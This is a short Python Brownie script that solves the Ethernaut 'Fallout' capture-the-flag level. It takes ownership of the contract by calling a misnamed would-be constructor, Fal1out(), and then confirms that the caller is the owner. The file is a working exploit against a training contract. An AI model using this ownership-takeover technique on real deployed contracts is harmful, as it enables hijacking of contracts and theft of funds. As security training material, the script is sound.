from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import Fallout

##########################################
# You will beat this level if

# 1. you claim ownership of the contract
#########################################

# solve the challenge
def solve_challenge():
    # load challenge
    fallout = load_challenge(ContractObject=Fallout, instance_key='fallout')

    # the Fal1out() function is not _really_ a constructor
    # if we call it with any value, we become owner
    fallout.Fal1out(_from | {'value':0})

    # check who's the owner
    print(fallout.owner())

    # check that we are owner
    owner_assertion = fallout.owner() == acc
    print(owner_assertion)

    return owner_assertion

def main():
    solve_challenge()
